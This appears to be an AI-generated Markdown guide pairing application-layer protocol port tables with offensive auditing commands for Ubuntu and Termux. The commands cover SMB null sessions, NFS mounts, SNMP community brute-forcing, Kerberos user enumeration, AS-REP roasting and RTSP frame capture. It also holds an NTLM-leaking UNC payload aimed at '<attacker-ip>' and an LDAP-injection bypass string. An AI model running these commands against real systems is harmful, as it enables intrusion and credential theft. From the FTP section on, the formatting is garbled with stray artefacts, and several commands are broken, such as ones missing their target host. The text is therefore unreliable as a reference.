Here is the complete, consolidated master Markdown document combining your original Application Layer protocol reference tables and the full security auditing & web vulnerability guide across all 8 sections.
markdown
# Application Layer Protocols: Reference & Security Auditing Guide (Ubuntu & Termux)

While there is no single exhaustive list because new protocols are constantly created for custom software, standard Application Layer (Layer 7 in OSI / Layer 4 in TCP/IP) protocols are grouped by their primary network function, such as web browsing, email, file transfer, and network management.

Below is a comprehensive breakdown of the most widely used Application Layer protocols, along with their default ports, primary purposes, and authorized security auditing workflows.

---

## Part 1: Application Layer Protocol Reference Tables

### 1. Web & Data Browsing

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **HTTP** | Hypertext Transfer Protocol | 80 | Transfers web pages and media across the internet. |
| **HTTPS** | HTTP Secure | 443 | Encrypts HTTP traffic using TLS/SSL for secure browsing. |
| **WebSocket** | WebSocket Protocol | 80, 443 | Enables real-time, two-way communication between a browser and server. |
| **REST / GraphQL** | Representational State Transfer / GraphQL | 80, 443 | Web API architectural styles/protocols used for data exchange between apps. |

### 2. File Transfer & Sharing

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **FTP** | File Transfer Protocol | 20, 21 | Transfers files between a client and server (unencrypted). |
| **SFTP** | SSH File Transfer Protocol | 22 | Securely transfers files over an encrypted SSH tunnel. |
| **FTPS** | FTP Secure | 989, 990 | Adds TLS/SSL encryption to standard FTP. |
| **TFTP** | Trivial File Transfer Protocol | 69 | Lightweight, unauthenticated file transfer (often used for booting devices). |
| **SMB / CIFS** | Server Message Block | 445 | Shares files, printers, and serial ports across Windows/Linux local networks. |
| **NFS** | Network File System | 2049 | Allows a user on a client computer to access files over a network (common on Linux/Unix). |

### 3. Email & Messaging

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **SMTP** | Simple Mail Transfer Protocol | 25, 465, 587 | Sends and routes outgoing emails between servers. |
| **IMAP** | Internet Message Access Protocol | 143, 993 | Retrieves and synchronizes emails while keeping them stored on the server. |
| **POP3** | Post Office Protocol v3 | 110, 995 | Downloads emails from a server to a local device (usually deleting them from the server). |
| **XMPP** | Extensible Messaging and Presence Protocol | 5222 | Real-time instant messaging and presence information (formerly Jabber). |
| **IRC** | Internet Relay Chat | 194, 6667 | Real-time text messaging in group channels. |

### 4. Remote Access & Terminal Control

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **SSH** | Secure Shell | 22 | Secure, encrypted command-line remote login and command execution. |
| **Telnet** | Teletype Network | 23 | Unencrypted remote terminal access (largely replaced by SSH). |
| **RDP** | Remote Desktop Protocol | 3389 | Provides a graphical user interface (GUI) to control another computer remotely. |
| **VNC** | Virtual Network Computing | 5900 | Cross-platform graphical desktop-sharing system. |

### 5. Network Naming, Addressing & Configuration

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **DNS** | Domain Name System | 53 | Translates human-readable domain names (e.g., google.com) into IP addresses. |
| **DHCP** | Dynamic Host Configuration Protocol | 67, 68 | Automatically assigns IP addresses, subnet masks, and gateways to devices. |
| **NTP** | Network Time Protocol | 123 | Synchronizes system clocks across computer networks. |
| **LDAP** | Lightweight Directory Access Protocol | 389, 636 | Queries and modifies directory services (like Microsoft Active Directory). |
| **Kerberos** | Kerberos Authentication Protocol | 88 | Authenticates users and services securely over an insecure network using tickets. |
| **RADIUS** | Remote Authentication Dial-In User Service | 1812, 1813 | Centralized Authentication, Authorization, and Accounting (AAA) for network access. |

### 6. Network Management & Monitoring

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **SNMP** | Simple Network Management Protocol | 161, 162 | Monitors and manages network devices (routers, switches, servers). |
| **Syslog** | System Logging Protocol | 514 | Sends system event and log messages to a central logging server. |
| **NETCONF** | Network Configuration Protocol | 830 | Installs, manipulates, and deletes the configuration of network devices. |

### 7. Voice, Video & Real-Time Media

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **SIP** | Session Initiation Protocol | 5060, 5061 | Initiates, maintains, and terminates voice and video calls (VoIP). |
| **RTP** | Real-time Transport Protocol | Dynamic (16384–32767) | Delivers live audio and video streams over IP networks. |
| **RTSP** | Real-Time Streaming Protocol | 554 | Controls streaming media servers (play, pause, record). |
| **WebRTC** | Web Real-Time Communication | Dynamic | Enables peer-to-peer audio, video, and data sharing directly inside web browsers. |

### 8. IoT & Industrial Protocols

| Protocol | Full Name | Port(s) | Purpose |
| :--- | :--- | :--- | :--- |
| **MQTT** | Message Queuing Telemetry Transport | 1883, 8883 | Lightweight publish-subscribe messaging protocol for IoT sensors and devices. |
| **CoAP** | Constrained Application Protocol | 5683 | Web transfer protocol designed for constrained/low-power IoT devices. |
| **AMQP** | Advanced Message Queuing Protocol | 5672 | Enterprise message-oriented middleware for queuing and routing messages. |

---

## Part 2: Security Auditing & Web Vulnerabilities (Sections 1–8)

### General Environment Differences: Ubuntu vs. Termux

* **Ubuntu:** Provides a full Linux kernel and root access (`sudo`). You can run raw socket scans (`nmap -sS`), UDP scans (`nmap -sU`), kernel-level filesystem mounts (`mount -t nfs/cifs`), packet sniffing (`tcpdump`, Wireshark), and native GUI clients.
* **Termux:** Runs in an unprivileged Android user space without root by default. Raw socket and UDP Nmap scans are restricted—always use TCP connect scans (`nmap -sT -Pn`) and user-space Python/Go/CLI utilities (`curl`, `nc`, `openssl`, `pip`, `pkg`).

---

### Section 1: Web & Data Browsing Auditing

#### 1. HTTP (Port 80) & HTTPS (Port 443)
* **How it is audited (Ubuntu & Termux):**
  * **Header, TLS & Endpoint Inspection:** Checking security headers (`HSTS`, `CSP`, `CORS`), TLS cipher suites, and fuzzing hidden directories or backup files.
  * **Additional Auditing Commands:**
    ```bash
    # Inspect HTTP response headers and follow redirects
    curl -i -L -k https://<target>

    # Audit SSL/TLS certificates and cipher suites via Nmap
    nmap -sT -p 443 --script ssl-enum-ciphers,http-security-headers <target>

    # Fuzz hidden directories and backup files using ffuf (Ubuntu & Termux)
    ffuf -u https://<target>/FUZZ -w wordlist.txt -mc 200,301,302,403
    ```
* **Web Bugs Found:**
  * **Injection & Access Control Flaws:** XSS, SQLi, IDOR, SSRF, CORS misconfigurations, exposed `.git`/`.env` files, and weak TLS configurations.

#### 2. WebSocket (Ports 80, 443)
* **How it is audited (Ubuntu & Termux):**
  * **Frame Interception & Replay:** Inspecting WebSocket handshakes (`Upgrade: websocket`) and testing message-level authorization using proxies (Burp Suite / OWASP ZAP on Ubuntu) or CLI clients (`websocat` on Ubuntu & Termux).
  * **Additional Auditing Commands:**
    ```bash
    # Test WebSocket handshake manually via curl
    curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" -H "Sec-WebSocket-Version: 13" https://<target>/ws

    # Connect interactively to a WebSocket endpoint using websocat
    websocat wss://<target>/ws
    ```
* **Web Bugs Found:**
  * **Cross-Site WebSocket Hijacking (CSWSH):** Missing `Origin` header validation on the WebSocket handshake, plus IDOR or injection flaws inside JSON/XML WebSocket frames.

#### 3. REST / GraphQL (Ports 80, 443)
* **How it is audited (Ubuntu & Termux):**
  * **Method & Schema Enumeration:** Testing HTTP methods (`OPTIONS`, `PUT`, `DELETE`), API versioning (`/v1/`, `/v2/`), and GraphQL introspection queries.
  * **Additional Auditing Commands:**
    ```bash
    # Check allowed HTTP methods on an API endpoint
    curl -i -X OPTIONS https://<target>/api/v1/users

    # Test if GraphQL introspection is enabled in production
    curl -s -X POST -H "Content-Type: application/json" --data '{"query":"{__schema{types{name}}}"}' https://<target>/graphql
    ```
* **Web Bugs Found:**
  * **BOLA / IDOR & Introspection Leaks:** Broken Object Level Authorization, GraphQL introspection enabled in production, batching/aliasing DoS, and mass assignment.

---

### Section 2: File Transfer & Sharing Auditing

#### 1. FTP (Ports 20, 21) & FTPS (Ports 989, 990)
* **How it is audited (Ubuntu & Termux):**
  * **Anonymous Access & Banner Checks:** Checking if `anonymous` login is enabled and inspecting the FTP server version (`vsftpd`, `ProFTPD`, `FileZilla`) for known vulnerabilities.
  * **Directory & Permission Enumeration:** Listing accessible directories and testing whether an authenticated or anonymous user can upload (`PUT`) or download (`GET`) files.
  * **Additional Auditing Commands:**
    ```bash
    # Check for anonymous login, bounce attacks, and server banners
    nmap -sT -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst <target>

    # Connect and test anonymous login via curl (works on Ubuntu & Termux)
    curl -v ftp://<target>/ --user anonymous:anonymous

    # Test FTPS (explicit TLS) connection and inspect SSL certificate
    openssl s_client -connect <target>:21 -starttls ftp

Use code with caution.
# Mirror/download all accessible files recursively for offline audit
wget -r --no-parent ftp://anonymous:anonymous@/
```
• Web Bugs Found:
	• Writable Web Root (RCE): When the FTP directory maps directly to the web server's document root (/var/www/html or inetpub/wwwroot), uploading a .php, .jsp, or .aspx file results in immediate Remote Code Execution.
	• Backup & Config Disclosure: Discovering database dumps (.sql), .env files, or source code archives inside publicly readable FTP folders.
	• FTP SSRF Pivoting: Exploiting web SSRF vulnerabilities via ftp:// URL wrappers to scan internal ports or interact with internal file servers.

2. SFTP (Port 22)

• How it is audited (Ubuntu & Termux):
	• Chroot & Path Traversal Checks: Verifying whether SFTP users are properly jailed (ChrootDirectory) or if they can navigate up into /etc/ or web application directories.
	• Cryptographic & Key Audits: Inheriting SSH security checks to verify weak ciphers or exposed key pairs.
	• Additional Auditing Commands:bash
# Connect interactively using specific identity key
sftp -i id_rsa user@<target>

# Non-interactive directory listing via batch mode
echo "ls -la /var/www/" | sftp -b - user@<target>

# Audit underlying SSH/SFTP algorithms
ssh-audit <target>
Use code with caution.
• Web Bugs Found:
	• Leaked SFTP Deployment Credentials: Modern CI/CD pipelines and web IDEs (e.g., VS Code sftp.json left inside .vscode/ in a public web root) frequently leak SFTP hostnames, usernames, and passwords.
	• Broken Chroot Isolation: Compromising a low-privilege SFTP upload account and traversing out to read web application configuration files.

3. TFTP (Port 69 - UDP)

• How it is audited (Ubuntu & Termux):
	• Unauthenticated File Probing: Because TFTP lacks authentication and directory listing (ls) features, auditors probe for predictable configuration filenames (e.g., startup-config, router.cfg).
	• Additional Auditing Commands:bash
# Scan UDP port 69 on Ubuntu (requires root)
sudo nmap -sU -p 69 --script tftp-enum <target>

# Attempt to pull a configuration file using standard tftp client
tftp <target> -c get startup-config

# Pull a file via curl (works on Termux without root)
curl -v tftp://<target>/startup-config -o startup-config
Use code with caution.
• Web Bugs Found:
	• Network Appliance Web Credential Leaks: Routers, VoIP phones, and switches often store their administrative web UI passwords and SNMP strings in plaintext inside TFTP-accessible boot files.

4. SMB / CIFS (Port 445)

• How it is audited (Ubuntu & Termux):
	• Null Session & Share Enumeration: Querying exposed shares, user lists, and password policies without credentials, and checking SMB signing requirements.
	• Additional Auditing Commands:bash
# Enumerate SMB shares, OS details, and signing status via Nmap
nmap -sT -p 445 --script smb-enum-shares,smb-os-discovery,smb2-security-mode <target>

# List available shares using null session (Ubuntu & Termux)
smbclient -L //<target>/ -N

# Connect to a specific readable/writable share
smbclient //<target>/<share_name> -N

# Comprehensive Python-based SMB/RPC enumeration (works on Ubuntu & Termux)
enum4linux-ng -A <target>
Use code with caution.
• Web Bugs Found:
	• NTLM Relay via Web XSS / SSRF: Injecting a UNC path (\\<attacker-ip>\payload or <img src="file://<attacker-ip>/x">) into a vulnerable web app forces the server or victim browser to send NetNTLMv2 hashes over SMB for offline cracking or relaying.
	• Exposed Web Application Shares: Misconfigured wwwroot or backup shares accessible to Everyone or Guest, allowing direct source code theft or web shell placement.

5. NFS (Port 2049)

• How it is audited (Ubuntu & Termux):
	• Export Enumeration & Permission Checks: Identifying exported directories and checking for no_root_squash or world-readable/writable flags (*).
	• Additional Auditing Commands:bash
# List exported NFS shares and allowed IP ranges via Nmap
nmap -sT -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>

# Query exported shares directly (Ubuntu)
showmount -e <target>

# Mount an exposed NFS share locally on Ubuntu (requires root)
sudo mkdir -p /mnt/nfs_audit
sudo mount -t nfs -o nolock <target>:/exported/path /mnt/nfs_audit
Use code with caution.
• Web Bugs Found:
	• Direct Web Root Access: Developers frequently export /var/www over NFS for easy deployment; if left open to 0.0.0.0/0, any external tester can mount the web root, read API secrets, or upload a web shell.

Section 3: Email & Messaging Auditing


1. SMTP (Ports 25, 465, 587)

• How it is audited (Ubuntu & Termux):
	• Open Relay & User Enumeration: Checking whether the mail server relays unauthenticated external emails (smtp-open-relay) or leaks valid internal usernames via VRFY, EXPN, or RCPT TO commands.
	• Spoofing & DNS Record Checks: Auditing SPF, DKIM, and DMARC DNS records to verify if an attacker can spoof emails from the target domain.
	• Additional Auditing Commands:bash
# Enumerate SMTP commands, open relays, and users via Nmap
nmap -sT -p 25,465,587 --script smtp-commands,smtp-open-relay,smtp-enum-users <target>

# Check SPF and DMARC DNS records for email spoofing vulnerabilities
dig TXT <target.com> +short
dig TXT _dmarc.<target.com> +short

# Manually test VRFY/EXPN commands via Netcat
nc -nv <target> 25

# Send a test email to verify relay rules using swaks (Ubuntu & Termux)
swaks --to victim@target.com --from spoof@target.com --server <target>
Use code with caution.
• Web Bugs Found:
	• SMTP Header Injection: Web contact forms or "Share via Email" features that fail to sanitize newline characters (%0A, %0D), allowing attackers to inject BCC: headers and turn the web server into a spam/phishing relay.
	• SSRF to Internal SMTP (gopher://): Using a web SSRF vulnerability to send raw SMTP commands to an internal-only mail server (127.0.0.1:25), bypassing external firewall restrictions.

2. IMAP (Ports 143, 993) & POP3 (Ports 110, 995)

• How it is audited (Ubuntu & Termux):
	• Cleartext Authentication & TLS Checks: Verifying whether unencrypted ports (143/110) allow plaintext login without enforcing STARTTLS, and inspecting SSL/TLS certificate details.
	• Additional Auditing Commands:bash
# Check IMAP/POP3 capabilities and cleartext login support
nmap -sT -p 110,143,993,995 --script imap-capabilities,pop3-capabilities <target>

# Connect to IMAPS (port 993) via OpenSSL to inspect certificates and test login
openssl s_client -connect <target>:993 -crlf

# Connect to POP3S (port 995) via OpenSSL
openssl s_client -connect <target>:995 -crlf
Use code with caution.
• Web Bugs Found:
	• IMAP / POP3 Command Injection in Webmail: Custom webmail interfaces that pass user-controlled search queries or folder names directly into backend IMAP commands without sanitization.
	• Leaked Mail Credentials in Web Configs: Discovering hardcoded IMAP/SMTP credentials inside exposed .env, wp-config.php, or configuration.php files.

3. XMPP (Port 5222) & IRC (Ports 194, 6667)

• How it is audited (Ubuntu & Termux):
	• Unauthenticated Access & Registration: Checking if XMPP allows in-band account registration or unencrypted connections, and inspecting IRC servers for open channels.
	• Additional Auditing Commands:bash
# Enumerate XMPP server features and authentication mechanisms
nmap -sT -p 5222 --script xmpp-info <target>

# Probe IRC server banners and info
nmap -sT -p 6667 --script irc-info <target>

# Connect to an unencrypted IRC port manually via Netcat
nc -nv <target> 6667
Use code with caution.
• Web Bugs Found:
	• Exposed Web-Based Chat Gateways (BOSH / WebSockets): XMPP servers often expose HTTP binding endpoints (/http-bind/ on ports 5280 or 7070) vulnerable to SSRF, XSS in web chat clients, or sensitive information disclosure in public developer channels.

Section 4: Remote Access & Terminal Control Auditing


1. SSH (Port 22)

• How it is audited (Ubuntu & Termux):
	• Banner Grabbing & Enumeration: Using nmap -sV -p 22 <target> or ssh-audit (available via Python pip on both Ubuntu and Termux) to check supported encryption algorithms, MACs, and outdated OpenSSH versions.
	• Port Forwarding / Tunneling: During authorized post-exploitation or internal assessments, ssh -L or ssh -D (SOCKS proxy) is used to route web traffic from your local browser into internal web dashboards that are not exposed to the internet.
	• Additional Auditing Commands:bash
# Grab raw SSH banner using Netcat
nc -nv <target> 22

# Enumerate supported SSH authentication methods and host keys
nmap -p 22 --script ssh-auth-methods,ssh-hostkey <target>

# Run full cryptographic audit
ssh-audit <target>

# Create a local SOCKS5 proxy on port 9050 to route browser traffic internally
ssh -D 9050 -N user@<target>

# Forward an internal web port (8080) to your local machine (8081)
ssh -L 8081:127.0.0.1:8080 user@<target>
Use code with caution.
• Web Bugs Found:
	• Exposed Private Keys in Web Roots: Web servers or public Git repositories (.git/config, /.ssh/id_rsa, deployment.sh) accidentally leaking SSH private keys, granting direct server access.
	• SSRF to Internal SSH: Identifying outdated SSH banners internally via SSRF bugs (gopher:// or dict:// wrappers in older libraries).

2. Telnet (Port 23)

• How it is audited (Ubuntu & Termux):
	• Banner & Service Inspection: Using telnet <target> 23 or nc <target> 23 (available via netcat-openbsd in both environments) to inspect login prompts, device firmware versions, and unauthenticated administrative menus.
	• Traffic Analysis: On Ubuntu (with tcpdump or Wireshark), auditors verify whether legacy systems transmit credentials in cleartext over local segments.
	• Additional Auditing Commands:bash
# Enumerate Telnet encryption options and banners via Nmap
nmap -sV -p 23 --script telnet-encryption,telnet-ntlm-info <target>

# Connect interactively to inspect prompts
nc -nv <target> 23

# Capture cleartext Telnet traffic on Ubuntu (requires root)
sudo tcpdump -i eth0 port 23 -A
Use code with caution.
• Web Bugs Found:
	• Hardcoded IoT/Router Credentials: Web-based router/camera admin panels often expose Telnet on the WAN interface with default credentials documented in public firmware or leaked in web UI JavaScript files.
	• Command Injection in Web UIs: Web interfaces for network appliances frequently pass user input directly into backend Telnet or shell commands.

3. RDP (Port 3389)

• How it is audited (Ubuntu & Termux):
	• Encryption & NLA Checks: Using nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 <target> to verify if Network Level Authentication (NLA) is enforced and to extract internal Windows domain names and OS build numbers.
	• Client Connection: On Ubuntu, xfreerdp connects directly to test access. On Termux, xfreerdp can be compiled or paired with Termux:X11, though auditors typically rely on nmap NSE scripts for enumeration.
	• Additional Auditing Commands:bash
# Audit RDP encryption, NLA status, and NTLM domain disclosure
nmap -sT -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <target>

# Check if NLA is disabled using xfreerdp (Ubuntu)
xfreerdp /v:<target> /sec:rdp /cert:ignore +auth-only

# Test valid credentials without spawning a full desktop session
xfreerdp /v:<target> /u:<username> /p:<password> /cert:ignore +auth-only
Use code with caution.
• Web Bugs Found:
	• Information Disclosure via NTLM: Even without logging in, querying RDP (or web-based RD Web Access portals) reveals internal Active Directory domain names and server hostnames useful for targeted phishing or web auth bypasses.
	• Exposed RD Web Access / Gateways: Misconfigured IIS web portals (/RDWeb/) vulnerable to username enumeration, weak password policies, or known gateway CVEs.

4. VNC (Port 5900+)

• How it is audited (Ubuntu & Termux):
	• Authentication & Security Type Checks: Using nmap --script vnc-info,realvnc-auth-bypass -p 5900 <target> to check if authentication is disabled ("None") or if legacy authentication bypass flaws exist.
	• Screen Capture / Viewing: On Ubuntu, tools like vncviewer or EyeWitness capture screenshots of exposed VNC desktops. On Termux, auditors use Python scripts or nmap scripts to verify open sessions.
	• Additional Auditing Commands:bash
# Scan common VNC ports (5900-5905) and check security types
nmap -sT -p 5900-5905 --script vnc-info,vnc-title <target>

# Check RFB protocol handshake version manually via Netcat
nc -nv <target> 5900

# Probe common noVNC web endpoints via curl
curl -I -k http://<target>:6080/vnc.html
Use code with caution.
• Web Bugs Found:
	• Exposed noVNC WebSockets: Many cloud environments, Docker containers, and virtual lab platforms expose VNC over HTTP/WebSockets (commonly ports 6080 or 8080 via noVNC). Finding an unauthenticated noVNC web endpoint in a bug bounty scope often leads directly to full graphical Remote Code Execution (RCE) in the browser.

Section 5: Network Naming, Addressing & Configuration Auditing


1. DNS (Port 53)

• How it is audited (Ubuntu & Termux):
	• Zone Transfers (AXFR) & Record Enumeration: Testing if authoritative name servers misconfigure zone transfers, exposing every internal and external subdomain at once.
	• Subdomain & CNAME Auditing: Enumerating subdomains and inspecting CNAME records for dangling pointers to unclaimed third-party services.
	• Additional Auditing Commands:bash
# Find authoritative nameservers for a domain
dig NS <target.com> +short

# Attempt a DNS Zone Transfer (AXFR) against a nameserver
dig axfr @<://target.com> <target.com>

# Enumerate DNS records and check for cache snooping via Nmap
nmap -sT -p 53 --script dns-nsid,dns-recursion <target>

# Passive subdomain discovery (Go binary works on both Ubuntu & Termux)
subfinder -d <target.com> -silent
Use code with caution.
• Web Bugs Found:
	• Subdomain Takeover: When a subdomain (://target.com) has a CNAME record pointing to an expired cloud service (AWS S3, GitHub Pages, Heroku, Azure) that an attacker can claim to host malicious web content under the victim's domain.
	• DNS Rebinding (SSRF Bypass): Configuring a malicious DNS server to resolve a domain first to a public IP (passing web SSRF validation) and immediately afterward to 127.0.0.1 (accessing internal web admin panels).

2. DHCP (Ports 67, 68 - UDP)

• How it is audited (Ubuntu & Termux):
	• DHCP Discover & Rogue Server Checks: Querying local DHCP servers to inspect offered gateway, DNS, and WPAD options (requires root on Ubuntu).
	• Additional Auditing Commands:bash
# Broadcast a DHCP Discover packet to inspect server options (Ubuntu root required)
sudo nmap --script broadcast-dhcp-discover
Use code with caution.
• Web Bugs Found:
	• WPAD (Web Proxy Auto-Discovery) Poisoning: If DHCP option 252 (WPAD) is unconfigured or spoofed on a local network, browsers automatically fetch http://wpad/wpad.dat, allowing an attacker to inject a malicious proxy PAC file and intercept all browser HTTP/HTTPS traffic.

3. NTP (Port 123 - UDP)

• How it is audited (Ubuntu & Termux):
	• System Info & Monlist Queries: Querying NTP servers for OS details, internal IP addresses, and peer lists.
	• Additional Auditing Commands:bash
# Query NTP server variables, OS version, and peer information
nmap -sU -p 123 --script ntp-info,ntp-monlist <target>

# Query NTP peers directly using ntpq (Ubuntu)
ntpq -p <target>
Use code with caution.
• Web Bugs Found:
	• Internal Infrastructure Disclosure: Leaking internal hostnames and exact OS kernel versions used to fingerprint backend web servers.

4. LDAP (Ports 389, 636)

• How it is audited (Ubuntu & Termux):
	• Anonymous Bind & Base DN Enumeration: Testing whether the LDAP directory allows unauthenticated read queries (anonymous bind) to dump usernames, email addresses, and group memberships.
	• Additional Auditing Commands:bash
# Check for anonymous binds and dump root DSE information via Nmap
nmap -sT -p 389,636 --script ldap-rootdse,ldap-search <target>

# Query LDAP base naming contexts anonymously using ldapsearch (Ubuntu & Termux)
ldapsearch -x -H ldap://<target>:389 -s base namingcontexts

# Dump all directory entries if anonymous bind is enabled
ldapsearch -x -H ldap://<target>:389 -b "DC=target,DC=com" "(objectClass=*)"
Use code with caution.
• Web Bugs Found:
	• LDAP Injection: Web login portals or employee search forms that concatenate user input directly into LDAP search filters (e.g., (&(uid=USER_INPUT)(password=PASS))), allowing authentication bypass via wildcards (*)(uid=*))(|(uid=*).

5. Kerberos (Port 88) & RADIUS (Ports 1812, 1813)

• How it is audited (Ubuntu & Termux):
	• User Enumeration & Pre-Auth Checks: Identifying valid Active Directory usernames without triggering account lockouts by inspecting Kerberos error codes (KDC_ERR_PREAUTH_REQUIRED vs KDC_ERR_C_PRINCIPAL_UNKNOWN).
	• Additional Auditing Commands:bash
# Enumerate valid Active Directory usernames via Kerberos (Ubuntu & Termux)
kerbrute userenum --dc <target> -d <target.com> users.txt

# Check for accounts vulnerable to AS-REP Roasting (Impacket - Ubuntu & Termux)
GetNPUsers.py <target.com>/ -usersfile users.txt -no-pass -dc-ip <target>
Use code with caution.
• Web Bugs Found:
	• SSO / Windows Integrated Auth Enumeration: Using valid usernames discovered via Kerberos to target web-based Outlook Web Access (OWA), ADFS, or VPN portals, and abusing SPNEGO/NTLM HTTP authentication endpoints.

Section 6: Network Management & Monitoring Auditing


1. SNMP (Ports 161, 162 - UDP)

• How it is audited (Ubuntu & Termux):
	• Community String Brute-Forcing & OID Walking: Testing SNMPv1/v2c for default community strings (public, private, manager) and walking the Management Information Base (MIB) tree to extract running processes, network interfaces, and routing tables.
	• Additional Auditing Commands:bash
# Scan UDP port 161 and enumerate system info/processes on Ubuntu (requires root)
sudo nmap -sU -p 161 --script snmp-info,snmp-processes,snmp-netstat <target>

# Brute-force SNMP community strings (works on Ubuntu & Termux)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# Walk the entire SNMPv2c OID tree using the 'public' community string
snmpwalk -v2c -c public <target>

# Query specific OIDs (e.g., running software/processes)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2
Use code with caution.
• Web Bugs Found:
	• Plaintext Web Admin Credentials & API Keys: Network routers, printers, and servers frequently store web UI passwords, database connection strings, and internal API URLs inside SNMP OID variables or process arguments (hrSWRunParameters).

2. Syslog (Port 514 - UDP/TCP)

• How it is audited (Ubuntu & Termux):
	• Unauthenticated Log Injection Checks: Verifying whether port 514 accepts arbitrary log messages from external or untrusted IP addresses without TLS or source filtering.
	• Additional Auditing Commands:bash
# Probe TCP port 514 for exposed Syslog listeners
nmap -sT -p 514 <target>

# Send a test Syslog message over UDP using Netcat (Ubuntu & Termux)
echo "<14>Test audit log entry" | nc -u -w1 <target> 514

# Send a test Syslog message over TCP
echo "<14>Test audit log entry" | nc -w1 <target> 514
Use code with caution.
• Web Bugs Found:
	• Stored XSS / Log Injection in Web SIEM Dashboards: Injecting HTML/JavaScript payloads or CRLF characters into Syslog messages that later execute in an administrator's browser when viewed inside a web-based log viewer (e.g., Splunk, Kibana, Graylog).

3. NETCONF (Port 830)

• How it is audited (Ubuntu & Termux):
	• Subsystem & XML Capability Checks: Connecting to the NETCONF SSH subsystem on port 830 to inspect supported YANG data models and XML RPC handling.
	• Additional Auditing Commands:bash
# Check if NETCONF port 830 is open and inspect SSH banner
nmap -sT -sV -p 830 <target>

# Connect to the NETCONF SSH subsystem manually (Ubuntu & Termux)
ssh -s user@<target> -p 830 netconf
Use code with caution.
• Web Bugs Found:
	• XXE (XML External Entity) Injection: Web-based network orchestrators and SDN dashboards that translate user input into backend NETCONF XML RPC payloads without disabling external entity resolution.

Section 7: Voice, Video & Real-Time Media Auditing


1. SIP (Ports 5060, 5061)

• How it is audited (Ubuntu & Termux):
	• Extension Enumeration & Registration Checks: Probing SIP servers (OPTIONS, REGISTER, INVITE) to identify PBX software versions (Asterisk, FreePBX) and enumerate valid internal phone extensions.
	• Additional Auditing Commands:bash
# Probe SIP options and server banner via Nmap
nmap -sT -sV -p 5060,5061 --script sip-methods,sip-enum-users <target>

# Scan for SIP devices and enumerate extensions using SIPVicious (Ubuntu & Termux)
svmap <target>
svwar -e 100-500 <target>

# Send a raw SIP OPTIONS request over TCP via Netcat
printf "OPTIONS sip:<target> SIP/2.0\r\nVia: SIP/2.0/TCP 127.0.0.1:5060\r\nFrom: <sip:audit@127.0.0.1>\r\nTo: <sip:audit@<target>>\r\nCall-ID: 12345@127.0.0.1\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n" | nc -nv <target> 5060
Use code with caution.
• Web Bugs Found:
	• Exposed Web PBX Admin Panels: Discovering SIP servers often leads directly to co-hosted web interfaces (FreePBX, 3CX, Elastix) vulnerable to default credentials, SQLi, or RCE.
	• SIP Header Injection via Click-to-Call: Web applications offering "Click-to-Call" forms that pass unvalidated phone numbers into backend SIP INVITE headers.

2. RTP (Dynamic 16384–32767) & RTSP (Port 554)

• How it is audited (Ubuntu & Termux):
	• Unauthenticated Stream Discovery: Testing RTSP endpoints for default stream paths (/live.sdp, /h264, /stream1) that allow viewing live feeds without credentials.
	• Additional Auditing Commands:bash
# Brute-force common RTSP stream URLs and check methods via Nmap
nmap -sT -p 554 --script rtsp-methods,rtsp-url-brute <target>

# Test an RTSP stream endpoint using curl DESCRIBE request (Ubuntu & Termux)
curl -i -X DESCRIBE rtsp://<target>:554/stream1

# Capture a single frame from an unauthenticated RTSP stream using ffmpeg
ffmpeg -i rtsp://<target>:554/stream1 -frames:v 1 frame_audit.jpg
Use code with caution.
• Web Bugs Found:
	• Unauthenticated IP Camera Feeds & Path Traversal: Web-based surveillance portals exposing raw RTSP URLs in frontend HTML/JS source code without token authentication, or web servers vulnerable to path traversal on /stream/ endpoints.

3. WebRTC (Dynamic)

• How it is audited (Ubuntu & Termux):
	• STUN/TURN Configuration & SDP Inspection: Analyzing Session Description Protocol (SDP) offers/answers and TURN server credentials embedded in web application JavaScript.
	• Additional Auditing Commands:bash
# Check exposed STUN/TURN ports (3478, 5349) via Nmap
nmap -sT -sV -p 3478,5349 --script stun-info <target>
Use code with caution.
• Web Bugs Found:
	• TURN Server SSRF / Internal Network Pivoting: Misconfigured TURN relay servers that allow authenticated (or anonymous) web users to relay traffic to 127.0.0.1 or internal cloud metadata IPs (169.254.169.254).
	• Hardcoded TURN Credentials in Frontend JS: Leaking static username and credential strings for TURN servers inside client-side WebRTC JavaScript bundles.

Section 8: IoT & Industrial Protocols Auditing


1. MQTT (Ports 1883, 8883)

• How it is audited (Ubuntu & Termux):
	• Anonymous Broker Access & Wildcard Subscription: Connecting to port 1883 without credentials and subscribing to # (all topics) to monitor live telemetry and command messages.
	• Additional Auditing Commands:bash
# Check if MQTT broker allows unauthenticated connections via Nmap
nmap -sT -p 1883,8883 --script mqtt-subscribe <target>

# Subscribe to all topics (#) anonymously using mosquitto_sub (Ubuntu & Termux)
mosquitto_sub -h <target> -p 1883 -t '#' -v

# Test publishing a benign audit message to a topic
mosquitto_pub -h <target> -p 1883 -t 'test/audit' -m 'ping'
Use code with caution.
• Web Bugs Found:
	• MQTT-over-WebSockets Exposure & Stored XSS: Many IoT web dashboards connect to MQTT over WebSockets (commonly port 8083 or 9001). Subscribing anonymously often leaks user session tokens, GPS locations, or device API keys, while publishing crafted payloads can trigger Stored XSS in admin web panels.

2. CoAP (Port 5683 - UDP)

• How it is audited (Ubuntu & Termux):
	• Resource Discovery (.well-known/core): Querying the standard CoAP discovery endpoint to list all exposed sensor routes and supported methods (GET, PUT, POST).
	• Additional Auditing Commands:bash
# Query available CoAP endpoints on Ubuntu (requires root for UDP Nmap)
sudo nmap -sU -p 5683 --script coap-resources <target>

